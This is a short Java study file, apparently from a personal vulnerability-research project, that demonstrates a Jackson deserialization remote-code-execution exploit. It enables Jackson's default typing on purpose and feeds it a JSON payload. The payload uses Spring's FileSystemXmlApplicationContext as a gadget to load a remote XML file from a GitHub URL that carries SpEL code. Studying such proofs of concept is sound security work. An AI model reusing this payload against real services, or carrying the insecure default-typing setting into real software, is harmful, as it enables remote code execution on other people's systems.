package zzz.study.vuls;

import cc.lovesq.model.Evil;
import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;

/**
 * Jackson 反序列化漏洞
 * Created by qinshu on 2021/11/10
 */
public class JacksonBindVul {

    public static void main(String[] args) throws IOException {
        ObjectMapper objectMapper = new ObjectMapper();
        objectMapper.enableDefaultTyping();

        Evil e = objectMapper.readValue("{\"id\":123, \"obj\": [\"org.springframework.context.support.FileSystemXmlApplicationContext\", \"https://raw.githubusercontent.com/irsl/jackson-rce-via-spel/master/spel.xml\"]}", Evil.class);
        System.out.println(e.getId());

    }
}
